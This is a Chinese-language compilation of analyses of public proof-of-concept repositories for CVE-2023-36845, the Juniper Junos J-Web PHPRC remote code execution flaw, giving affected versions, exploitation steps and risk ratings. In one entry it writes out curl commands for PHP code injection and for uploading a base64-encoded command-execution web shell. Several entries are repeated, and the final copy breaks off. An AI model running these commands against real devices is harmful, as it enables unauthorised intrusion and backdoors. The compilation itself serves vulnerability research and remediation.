**项目地址:** [halencarjunior/CVE-2023-36845](https://github.com/halencarjunior/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #10

**来源**: [CVE-2023-36845-ifconfig-me_CVE-2023-36845.md](../2023/CVE-2023-36845-ifconfig-me_CVE-2023-36845.md)

## CVE-2023-36845 - Juniper Junos OS J-Web PHP External Variable Modification

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Junos OS J-Web (EX Series 和 SRX Series)

**危害等级:** 严重，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** 受影响版本详见漏洞库信息

**利用条件:** 目标设备需要启用 J-Web 的 HTTP 或 HTTPS 服务（[system services web-management http] 或 [system services web-management https]）。需要网络可达。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞是由于 J-Web 的 PHP 代码中存在外部变量修改漏洞。未经身份验证的攻击者可以通过构造恶意请求，设置 `PHPRC` 变量来修改 PHP 的执行环境，从而注入并执行任意代码。

**利用方式：**
1.  攻击者发送包含恶意 `PHPRC` 参数的 HTTP 请求到目标设备的 J-Web 接口的`/about.php`页面。
2.  `PHPRC` 参数指向一个包含恶意 PHP 代码的文件，或者使用 `data://` 流直接嵌入恶意代码。
3.  由于PHP配置被篡改，服务器会执行恶意代码，从而实现远程代码执行。

**POC 代码分析：**
提供的 `CVE-2023-36845.sh` 脚本通过 `curl` 命令发送包含 `PHPRC` 参数的请求，尝试读取 `/etc/passwd` 文件。如果成功读取，则表明目标易受攻击。脚本首先尝试从 `CVE-2023-36845-targets.txt` 文件读取目标 URL 列表进行批量测试。然后，它调用 `fetch_etc_passwd` 函数，构造包含恶意 `PHPRC` 的请求。如果无法读取 `/etc/passwd`，它会尝试从`CVE-2023-36845-urls.txt`读取 URL 列表并打印。

**有效性：**
该 POC 代码有效，因为它重现了利用 `PHPRC` 变量修改 PHP 环境并读取文件的过程。如果成功读取 `/etc/passwd`，则可以证明目标设备存在漏洞，可以通过修改利用代码来执行其他操作（例如，执行系统命令）。

**投毒风险：**
代码本身看起来没有明显的投毒行为。它主要执行 HTTP 请求和文件读取操作。`README.md` 中也包含了免责声明，虽然不能完全排除作者恶意行为的可能性，但从代码逻辑来看，没有发现明显的恶意代码，**投毒风险为0%**。需要注意的是，实际利用中需要谨慎验证下载的脚本，并理解其行为。

**漏洞修复：**
升级到 Juniper 官方发布的修复版本，或禁用 J-Web 接口，或限制 J-Web 的访问权限。

**项目地址:** [ifconfig-me/CVE-2023-36845](https://github.com/ifconfig-me/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #11

**来源**: [CVE-2023-36845-iveresk_CVE-2023-36845-6-.md](../2023/CVE-2023-36845-iveresk_CVE-2023-36845-6-.md)

## CVE-2023-36845 Juniper Junos OS J-Web RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Junos OS J-Web (EX and SRX Series)

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本见CVE描述：所有版本 prior to 20.4R3-S9; 21.1 versions 21.1R1 and later; 21.2 versions prior to 21.2R3-S7; 21.3 versions prior to 21.3R3-S5; 21.4 versions prior to 21.4R3-S5; 22.1 versions prior to 22.1R3-S4; 22.2 versions prior to 22.2R3-S2; 22.3 versions prior to 22.3R2-S2, 22.3R3-S1; 22.4 versions prior to 22.4R2-S1, 22.4R3; 23.2 versions prior to 23.2R1-S1, 23.2R2.

**利用条件:** 目标设备已启用 J-Web 服务 (HTTP 或 HTTPS)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS EX 和 SRX 系列的 J-Web 组件中的一个 PHP 外部变量修改漏洞。该漏洞允许未经身份验证的远程攻击者通过构造特殊的请求来修改 PHP 的执行环境，从而实现远程代码执行。

**利用方式：**

攻击者通过设置 `PHPRC` 环境变量为 `/dev/fd/0`，并通过 `data-binary` 参数传递 PHP 代码。 由于`/dev/fd/0`代表标准输入，攻击者可以将任意PHP代码写入到标准输入中，这些代码会被作为PHP配置文件执行。 在提供的POC中，利用`auto_prepend_file`指令包含`/etc/passwd`文件，从而验证漏洞的存在。 实际的利用中，攻击者可以注入任意的恶意PHP代码，实现远程代码执行。

**有效性：**
提供的 POC 代码通过 curl 发送一个带有恶意 `PHPRC` 参数的 HTTP 请求。 该请求的目标是 `/about.php` 页面，并尝试包含 `/etc/passwd` 文件。 如果目标存在漏洞，则响应中会包含 `/etc/passwd` 的内容，证明 POC 有效。

**投毒风险：**

提供的脚本非常简单，主要功能就是发送包含恶意参数的请求。该脚本没有发现明显的投毒代码。但是，用户需要注意下载的脚本来源，防止被恶意替换。

根据现有信息，代码本身直接包含恶意代码的可能性较低。风险主要在于代码作者可能在其他地方埋藏恶意链接，或者在其他恶意软件中捆绑该脚本。 因此，判断投毒风险为0%。


**项目地址:** [iveresk/CVE-2023-36845-6-](https://github.com/iveresk/CVE-2023-36845-6-)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #12

**来源**: [CVE-2023-36845-jahithoque_Juniper-CVE-2023-36845-Mass-Hunting.md](../2023/CVE-2023-36845-jahithoque_Juniper-CVE-2023-36845-Mass-Hunting.md)

## CVE-2023-36845-Junos OS-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行

**影响应用:** Junos OS (EX Series, SRX Series)

**危害等级:** 严重，允许未经身份验证的远程攻击者执行代码

**影响版本:** 受影响版本包括但不限于：20.4R3-S9之前的所有版本，21.1，21.2R3-S7之前的所有版本，21.3R3-S5之前的所有版本，21.4R3-S5之前的所有版本，22.1R3-S4之前的所有版本，22.2R3-S2之前的所有版本，22.3R2-S2, 22.3R3-S1之前的所有版本，22.4R2-S1, 22.4R3之前的所有版本，23.2R1-S1, 23.2R2之前的所有版本。

**利用条件:** 需要开启J-Web，且可以通过网络访问J-Web服务 (http 或 https)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 的 J-Web 组件中的一个 PHP 外部变量修改漏洞。攻击者可以通过构造恶意请求，设置 `PHPRC` 环境变量来修改 PHP 的执行环境，从而注入并执行任意代码。

**漏洞利用方式：**

1.  **攻击向量：** 网络
2.  **攻击条件：** 目标设备必须运行受影响版本的 Junos OS，并且启用了 J-Web 管理界面 (http 或 https)。
3.  **漏洞原理：** 通过 `PHPRC` 环境变量，指定一个包含恶意 PHP 代码的文件。由于 J-Web 对该变量的过滤不严，导致 PHP 在执行时会加载并执行该文件，从而实现远程代码执行。
4.  **POC 分析：** 提供的 `Juniper-RCE-Check.sh` 脚本通过发送包含恶意 `PHPRC` 参数的 HTTP 请求到 `/about.php` 页面，其中PHPRC的值被设置为 `/dev/fd/0`，并使用`auto_prepend_file` 尝试将 `/etc/passwd` 的内容包含到响应中。如果响应中包含 `root:` 字符串，则表示目标存在漏洞，攻击者可以利用此漏洞执行任意代码。

**投毒风险分析：**

提供的 `Juniper-RCE-Check.sh` 脚本的功能是检测目标是否存在 CVE-2023-36845 漏洞，而不是进行漏洞利用或植入后门。该脚本只是通过 `curl` 命令发送一个 HTTP 请求，并检查响应的内容。其中使用的`/etc/passwd`只是用于验证，并不会对目标系统造成永久性影响。LICENSE文件也是标准的Creative Commons协议。

**有效性：**
根据漏洞库信息和提供的POC脚本，可以确定该漏洞利用是有效的。POC脚本验证了通过修改`PHPRC`环境变量，攻击者能够控制PHP的执行，从而读取敏感文件 (例如 `/etc/passwd`)。结合漏洞描述，可以推断出利用该漏洞执行任意代码是可行的。

**结论：**
该漏洞为高危漏洞，利用简单，影响范围广。强烈建议受影响的用户及时升级到安全版本。

**项目地址:** [jahithoque/Juniper-CVE-2023-36845-Mass-Hunting](https://github.com/jahithoque/Juniper-CVE-2023-36845-Mass-Hunting)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #13

**来源**: [CVE-2023-36845-kljunowsky_CVE-2023-36845.md](../2023/CVE-2023-36845-kljunowsky_CVE-2023-36845.md)

## CVE-2023-36845-Juniper Junos OS J-Web PHP 外部变量修改 RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 严重，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息

**利用条件:** 目标设备开启 J-Web 服务，且运行于受影响的 Junos OS 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞存在于 Juniper Networks Junos OS 的 J-Web 界面中。未经身份验证的攻击者可以通过修改 PHP 的 `PHPRC` 环境变量，从而控制 PHP 的执行环境，最终实现远程代码执行。

**漏洞利用方式：**

1.  **利用 PHPRC 变量:** 攻击者发送特制的 HTTP 请求，其中包含 `PHPRC` 参数，将其指向一个可控的文件描述符 `/dev/fd/0`。利用`auto_prepend_file`参数，加载恶意代码，例如使用 `data://` 协议嵌入经过 base64 编码的 PHP 代码。简单的例子就是读取/etc/passwd 文件进行漏洞验证。

```
curl "http://target.tld/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'
```
2.  **上传文件:**  攻击者可以通过 `/webauth_operation.php` 接口上传包含恶意代码的 PHP 文件，然后通过访问该文件执行恶意代码。
```
$ curl http://target.tld/webauth_operation.php -d 'rs=do_upload&rsargs[]=[{"fileName": "shell.php", "fileData": ",PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUW2NtZF0pKXsgZWNobyAiPHByZT4iOyAkY21kID0gKCRfUkVRVUVTVFtjbWRdKTsgc3lzdGVtKCRjbWQpOyBlY2hvICI8L3ByZT4iOyBkaWU7IH0/Pgo=\n", "csize": 110}]'
```

**投毒风险分析：**

提供的漏洞利用代码主要用于检测漏洞是否存在，通过读取 `/etc/passwd` 文件进行验证。虽然此行为本身不属于投毒，但如果攻击者利用此代码大规模扫描网络，可能会引起目标系统的注意。

RCE 的方法演示中，利用 `data://` 协议执行任意 PHP 代码，存在一定的风险，攻击者可以利用此方法植入后门代码。上传文件的攻击利用方式，需要找到对应的上传点，并绕过文件上传限制，复杂性较高。

LICENSE文件为MIT许可证，相对安全。
README.md文件提供了Shodan搜索方法和利用方式，整体风险较低，但存在被恶意利用的可能。综合考虑，投毒风险评估为10%。CISA已将此漏洞加入到已知被利用的漏洞目录，证明该漏洞已经被恶意利用。


**项目地址:** [kljunowsky/CVE-2023-36845](https://github.com/kljunowsky/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #14

**来源**: [CVE-2023-36845-kopfjager007_CVE-2023-36845.md](../2023/CVE-2023-36845-kopfjager007_CVE-2023-36845.md)

## CVE-2023-36845

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本见漏洞库信息

**利用条件:** 目标设备开启 J-Web (http 或 https)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是一个 Juniper Junos OS EX 系列和 SRX 系列设备 J-Web 组件中的 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造恶意请求设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行任意代码。

**有效性评估：**
根据漏洞库信息，该漏洞是真实存在的，CVSS 评分为 9.8 (Critical)，表明危害程度很高。CISA 已将其添加到已知被利用漏洞目录中，进一步表明该漏洞已被积极利用。

**投毒风险评估：**
提供的漏洞利用代码只是一个包含 README.md 文件的目录。README.md 文件仅包含漏洞名称和简短描述，没有实际的利用代码。因此，该代码本身不存在直接的投毒风险。

但是，需要注意的是，攻击者可能会在其他地方发布包含恶意代码的利用程序，伪装成 CVE-2023-36845 的利用程序。因此，在下载和使用任何利用代码时，都应该进行仔细审查，确保代码的安全性。
由于缺少实际的代码，无法进行更详细的分析，投毒风险评估相对保守。

**利用方式：**
1.  **前提条件：** 目标 Juniper 设备运行受影响的 Junos OS 版本，并且启用了 J-Web 服务（通过 HTTP 或 HTTPS）。
2.  **漏洞触发：** 攻击者构造一个包含 `PHPRC` 变量的 HTTP 请求发送到目标设备的 J-Web 接口。
3.  **代码注入：** 通过 `PHPRC` 变量，攻击者可以指定一个包含恶意 PHP 代码的文件路径，从而修改 PHP 的配置。
4.  **远程代码执行：** 当 J-Web 执行 PHP 代码时，恶意代码将被执行，从而允许攻击者在目标设备上执行任意命令。
5.  **进一步利用：** 攻击者可以通过执行的命令获取系统信息、修改配置、安装后门等，从而完全控制目标设备。

**项目地址:** [kopfjager007/CVE-2023-36845](https://github.com/kopfjager007/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #15

**来源**: [CVE-2023-36845-simrotion13_CVE-2023-36845.md](../2023/CVE-2023-36845-simrotion13_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改

**影响应用:** Junos OS J-Web (EX系列和SRX系列)

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息

**利用条件:** 目标设备开启了J-Web管理界面，并且允许通过HTTP或HTTPS访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Juniper Junos OS的J-Web管理界面中。攻击者可以通过修改`PHPRC`环境变量，控制PHP的配置，进而执行任意代码。

**漏洞利用方式：**

1.  攻击者发送一个特制的HTTP POST请求到目标J-Web服务器。
2.  该请求包含一个`PHPRC`参数，该参数被设置为指向一个恶意PHP配置文件或包含恶意代码的文件，例如`/dev/fd/0`，并结合`auto_prepend_file`包含`/etc/passwd`。
3.  由于`PHPRC`环境变量被修改，PHP在处理后续请求时会加载攻击者提供的恶意配置。
4.  通过`auto_prepend_file`，强制包含`/etc/passwd`文件内容,以验证漏洞存在。
5. 最终导致攻击者可以远程执行任意代码。

**有效性：**

提供的PoC代码是有效的，它通过`curl`命令发送带有恶意`PHPRC`参数的请求来验证漏洞。如果目标存在漏洞，将会返回`/etc/passwd`的内容，`grep -i 'root:'` 用于检测`/etc/passwd`是否存在，从而判断目标是否漏洞。

**投毒风险：**

分析提供的PoC代码，未发现明显的投毒代码。PoC代码的功能是发送恶意请求并验证漏洞是否存在，并没有执行任何恶意操作（例如植入后门），风险等级判定为0%。


**项目地址:** [simrotion13/CVE-2023-36845](https://github.com/simrotion13/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #16

**来源**: [CVE-2023-36845-vulncheck-oss_cve-2023-36845-scanner.md](../2023/CVE-2023-36845-vulncheck-oss_cve-2023-36845-scanner.md)

## CVE-2023-36845-Junos OS-J-Web-PHP外部变量修改-远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改

**影响应用:** Junos OS J-Web

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 所有低于 20.4R3-S9 的版本；21.1 版本 21.1R1 及更高版本；21.2 版本低于 21.2R3-S7；21.3 版本低于 21.3R3-S5；21.4 版本低于 21.4R3-S5；22.1 版本低于 22.1R3-S4；22.2 版本低于 22.2R3-S2；22.3 版本低于 22.3R2-S2, 22.3R3-S1；22.4 版本低于 22.4R2-S1, 22.4R3；23.2 版本低于 23.2R1-S1, 23.2R2。

**利用条件:** 启用了 J-Web (HTTP 或 HTTPS) 的 Junos OS 设备。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 中 J-Web 界面的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过发送特制的请求，设置 `PHPRC` 变量来修改 PHP 执行环境，从而注入和执行任意代码。由于漏洞允许远程代码执行，因此风险评级为严重。

**漏洞利用方式：**

1.  攻击者发送一个特制的 HTTP 请求到易受攻击的 Junos 设备上的 J-Web 接口。
2.  此请求包含一个设置 `PHPRC` PHP 配置变量的参数。通过修改该变量，攻击者可以控制 PHP 的配置文件的路径，从而包含恶意的 PHP 代码。
3.  设备执行攻击者提供的 PHP 代码，从而允许攻击者在设备上执行任意命令。

**关于投毒风险：**

分析提供的 `Dockerfile` 和 `LICENSE` 文件，没有发现明显的恶意代码或编译过程中的可疑操作。 `Dockerfile` 只是一个简单的 Go 编译环境，`LICENSE` 是 Apache 2.0 许可。漏洞利用代码部分缺失，无法判断是否存在后门。

但是，考虑到漏洞本身允许远程代码执行，即使提供的 `Dockerfile` 和 `LICENSE` 没有直接的投毒代码，攻击者仍然可以利用该漏洞在目标系统上植入恶意软件。因此，存在一定的投毒风险，假设为10%。

**项目地址:** [vulncheck-oss/cve-2023-36845-scanner](https://github.com/vulncheck-oss/cve-2023-36845-scanner)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #17

**来源**: [CVE-2023-36845-zaenhaxor_CVE-2023-36845.md](../2023/CVE-2023-36845-zaenhaxor_CVE-2023-36845.md)

## CVE-2023-36845-Junos OS-远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致远程代码执行

**影响应用:** Junos OS (EX Series 和 SRX Series) J-Web

**危害等级:** 高危，未授权远程代码执行

**影响版本:** 受影响版本: 所有版本 prior to 20.4R3-S9; 21.1 versions 21.1R1 and later; 21.2 versions prior to 21.2R3-S7; 21.3 versions prior to 21.3R3-S5; 21.4 versions prior to 21.4R3-S5; 22.1 versions prior to 22.1R3-S4; 22.2 versions prior to 22.2R3-S2; 22.3 versions prior to 22.3R2-S2, 22.3R3-S1; 22.4 versions prior to 22.4R2-S1, 22.4R3; 23.2 versions prior to 23.2R1-S1, 23.2R2.

**利用条件:** 需要开启J-Web服务 (http或https)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-36845 存在于Juniper Networks Junos OS 的 J-Web 组件中。攻击者可以通过设置 `PHPRC` 环境变量来修改 PHP 运行环境，从而远程执行代码。提供的 `cve.sh` 脚本读取一个包含目标主机列表的文件，然后通过构造包含恶意 `PHPRC` 参数的 HTTP 请求，尝试在目标系统上执行代码。脚本通过检查响应中是否包含 `root:` 字符串来判断漏洞是否成功利用，这是因为脚本尝试通过 `auto_prepend_file` 包含 `/etc/passwd` 文件。 

**有效性：**
POC 代码利用了 PHP 外部变量修改漏洞，通过设置 PHPRC 环境变量来包含任意文件，从而实现远程代码执行。该方法被广泛报道，并且CISA KEV 已经收录，确定了其有效性。

**投毒风险：**
脚本本身相对简单，主要功能是发送 HTTP 请求并检查响应。 投毒风险主要体现在以下几个方面：
*   **明面上的风险：** 脚本使用 curl 命令发送请求，存在被中间人攻击的风险，导致信息泄露或者被篡改。
*   **隐藏的风险：** 虽然脚本代码较为简短，但依然存在作者在其他地方植入恶意代码的可能性，比如通过读取其他配置文件、调用外部命令等方式。但是从目前的代码来看，直接的投毒风险较低， 评估为5%。

**利用方式：**
1.  **确定目标:**  需要一个存在漏洞且开启了 J-Web 服务的 Juniper 设备。
2.  **准备攻击脚本：** 使用提供的 `cve.sh` 脚本。
3.  **构造目标列表：** 创建一个包含目标设备 IP 地址或域名的文本文件（例如 `file.txt`）。
4.  **执行攻击：** 运行 `bash cve.sh file.txt` 命令。
5.  **验证结果：** 脚本会输出哪些主机存在漏洞（`VULN`）。


**项目地址:** [zaenhaxor/CVE-2023-36845](https://github.com/zaenhaxor/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---



---

## POC #11

**来源**: [CVE-2023-36845-iveresk_CVE-2023-36845-6-.md](../2023/CVE-2023-36845-iveresk_CVE-2023-36845-6-.md)

## CVE-2023-36845 Juniper Junos OS J-Web RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Junos OS J-Web (EX and SRX Series)

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本见CVE描述：所有版本 prior to 20.4R3-S9; 21.1 versions 21.1R1 and later; 21.2 versions prior to 21.2R3-S7; 21.3 versions prior to 21.3R3-S5; 21.4 versions prior to 21.4R3-S5; 22.1 versions prior to 22.1R3-S4; 22.2 versions prior to 22.2R3-S2; 22.3 versions prior to 22.3R2-S2, 22.3R3-S1; 22.4 versions prior to 22.4R2-S1, 22.4R3; 23.2 versions prior to 23.2R1-S1, 23.2R2.

**利用条件:** 目标设备已启用 J-Web 服务 (HTTP 或 HTTPS)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS EX 和 SRX 系列的 J-Web 组件中的一个 PHP 外部变量修改漏洞。该漏洞允许未经身份验证的远程攻击者通过构造特殊的请求来修改 PHP 的执行环境，从而实现远程代码执行。

**利用方式：**

攻击者通过设置 `PHPRC` 环境变量为 `/dev/fd/0`，并通过 `data-binary` 参数传递 PHP 代码。 由于`/dev/fd/0`代表标准输入，攻击者可以将任意PHP代码写入到标准输入中，这些代码会被作为PHP配置文件执行。 在提供的POC中，利用`auto_prepend_file`指令包含`/etc/passwd`文件，从而验证漏洞的存在。 实际的利用中，攻击者可以注入任意的恶意PHP代码，实现远程代码执行。

**有效性：**
提供的 POC 代码通过 curl 发送一个带有恶意 `PHPRC` 参数的 HTTP 请求。 该请求的目标是 `/about.php` 页面，并尝试包含 `/etc/passwd` 文件。 如果目标存在漏洞，则响应中会包含 `/etc/passwd` 的内容，证明 POC 有效。

**投毒风险：**

提供的脚本非常简单，主要功能就是发送包含恶意参数的请求。该脚本没有发现明显的投毒代码。但是，用户需要注意下载的脚本来源，防止被恶意替换。

根据现有信息，代码本身直接包含恶意代码的可能性较低。风险主要在于代码作者可能在其他地方埋藏恶意链接，或者在其他恶意软件中捆绑该脚本。 因此，判断投毒风险为0%。


**项目地址:** [iveresk/CVE-2023-36845-6-](https://github.com/iveresk/CVE-2023-36845-6-)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #12

**来源**: [CVE-2023-36845-jahithoque_Juniper-CVE-2023-36845-Mass-Hunting.md](../2023/CVE-2023-36845-jahithoque_Juniper-CVE-2023-36845-Mass-Hunting.md)

## CVE-2023-36845-Junos OS-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行

**影响应用:** Junos OS (EX Series, SRX Series)

**危害等级:** 严重，允许未经身份验证的远程攻击者执行代码

**影响版本:** 受影响版本包括但不限于：20.4R3-S9之前的所有版本，21.1，21.2R3-S7之前的所有版本，21.3R3-S5之前的所有版本，21.4R3-S5之前的所有版本，22.1R3-S4之前的所有版本，22.2R3-S2之前的所有版本，22.3R2-S2, 22.3R3-S1之前的所有版本，22.4R2-S1, 22.4R3之前的所有版本，23.2R1-S1, 23.2R2之前的所有版本。

**利用条件:** 需要开启J-Web，且可以通过网络访问J-Web服务 (http 或 https)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 的 J-Web 组件中的一个 PHP 外部变量修改漏洞。攻击者可以通过构造恶意请求，设置 `PHPRC` 环境变量来修改 PHP 的执行环境，从而注入并执行任意代码。

**漏洞利用方式：**

1.  **攻击向量：** 网络
2.  **攻击条件：** 目标设备必须运行受影响版本的 Junos OS，并且启用了 J-Web 管理界面 (http 或 https)。
3.  **漏洞原理：** 通过 `PHPRC` 环境变量，指定一个包含恶意 PHP 代码的文件。由于 J-Web 对该变量的过滤不严，导致 PHP 在执行时会加载并执行该文件，从而实现远程代码执行。
4.  **POC 分析：** 提供的 `Juniper-RCE-Check.sh` 脚本通过发送包含恶意 `PHPRC` 参数的 HTTP 请求到 `/about.php` 页面，其中PHPRC的值被设置为 `/dev/fd/0`，并使用`auto_prepend_file` 尝试将 `/etc/passwd` 的内容包含到响应中。如果响应中包含 `root:` 字符串，则表示目标存在漏洞，攻击者可以利用此漏洞执行任意代码。

**投毒风险分析：**

提供的 `Juniper-RCE-Check.sh` 脚本的功能是检测目标是否存在 CVE-2023-36845 漏洞，而不是进行漏洞利用或植入后门。该脚本只是通过 `curl` 命令发送一个 HTTP 请求，并检查响应的内容。其中使用的`/etc/passwd`只是用于验证，并不会对目标系统造成永久性影响。LICENSE文件也是标准的Creative Commons协议。

**有效性：**
根据漏洞库信息和提供的POC脚本，可以确定该漏洞利用是有效的。POC脚本验证了通过修改`PHPRC`环境变量，攻击者能够控制PHP的执行，从而读取敏感文件 (例如 `/etc/passwd`)。结合漏洞描述，可以推断出利用该漏洞执行任意代码是可行的。

**结论：**
该漏洞为高危漏洞，利用简单，影响范围广。强烈建议受影响的用户及时升级到安全版本。

**项目地址:** [jahithoque/Juniper-CVE-2023-36845-Mass-Hunting](https://github.com/jahithoque/Juniper-CVE-2023-36845-Mass-Hunting)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #13

**来源**: [CVE-2023-36845-kljunowsky_CVE-2023-36845.md](../2023/CVE-2023-36845-kljunowsky_CVE-2023-36845.md)

## CVE-2023-36845-Juniper Junos OS J-Web PHP 外部变量修改 RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 严重，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息

**利用条件:** 目标设备开启 J-Web 服务，且运行于受影响的 Junos OS 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞存在于 Juniper Networks Junos OS 的 J-Web 界面中。未经身份验证的攻击者可以通过修改 PHP 的 `PHPRC` 环境变量，从而控制 PHP 的执行环境，最终实现远程代码执行。

**漏洞利用方式：**

1.  **利用 PHPRC 变量:** 攻击者发送特制的 HTTP 请求，其中包含 `PHPRC` 参数，将其指向一个可控的文件描述符 `/dev/fd/0`。利用`auto_prepend_file`参数，加载恶意代码，例如使用 `data://` 协议嵌入经过 base64 编码的 PHP 代码。简单的例子就是读取/etc/passwd 文件进行漏洞验证。

```
curl "http://target.tld/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'
```
2.  **上传文件:**  攻击者可以通过 `/webauth_operation.php` 接口上传包含恶意代码的 PHP 文件，然后通过访问该文件执行恶意代码。
```
$ curl http://target.tld/webauth_operation.php -d 'rs=do_upload&rsargs[]=[{"fileName": "shell.php", "fileData": ",PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUW2NtZF0pKXsgZWNobyAiPHByZT4iOyAkY21kID0gKCRfUkVRVUVTVFtjbWRdKTsgc3lzdGVtKCRjbWQpOyBlY2hvICI8L3ByZT4iOyBkaWU7IH0/Pgo=\n", "csize": 110}]'
```

**投毒风险分析：**

提供的漏洞利用代码主要用于检测漏洞是否存在，通过读取 `/etc/passwd` 文件进行验证。虽然此行为本身不属于投毒，但如果攻击者利用此代码大规模扫描网络，可能会引起目标系统的注意。

RCE 的方法演示中，利用 `data://` 协议执行任意 PHP 代码，存在一定的风险，攻击者可以利用此方法植入后门代码。上传文件的攻击利用方式，需要找到对应的上传点，并绕过文件上传限制，复杂性较高。

LICENSE文件为MIT许可证，相对安全。
README.md文件提供了Shodan搜索方法和利用方式，整体风险较低，但存在被恶意利用的可能。综合考虑，投毒风险评估为10%。CISA已将此漏洞加入到已知被利用的漏洞目录，证明该漏洞已经被恶意利用。


**项目地址:** [kljunowsky/CVE-2023-36845](https://github.com/kljunowsky/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #14

**来源**: [CVE-2023-36845-kopfjager007_CVE-2023-36845.md](../2023/CVE-2023-36845-kopfjager007_CVE-2023-36845.md)

## CVE-2023-36845

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本见漏洞库信息

**利用条件:** 目标设备开启 J-Web (http 或 https)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是一个 Juniper Junos OS EX 系列和 SRX 系列设备 J-Web 组件中的 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造恶意请求设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行任意代码。

**有效性评估：**
根据漏洞库信息，该漏洞是真实存在的，CVSS 评分为 9.8 (Critical)，表明危害程度很高。CISA 已将其添加到已知被利用漏洞目录中，进一步表明该漏洞已被积极利用。

**投毒风险评估：**
提供的漏洞利用代码只是一个包含 README.md 文件的目录。README.md 文件仅包含漏洞名称和简短描述，没有实际的利用代码。因此，该代码本身不存在直接的投毒风险。

但是，需要注意的是，攻击者可能会在其他地方发布包含恶意代码的利用程序，伪装成 CVE-2023-36845 的利用程序。因此，在下载和使用任何利用代码时，都应该进行仔细审查，确保代码的安全性。
由于缺少实际的代码，无法进行更详细的分析，投毒风险评估相对保守。

**利用方式：**
1.  **前提条件：** 目标 Juniper 设备运行受影响的 Junos OS 版本，并且启用了 J-Web 服务（通过 HTTP 或 HTTPS）。
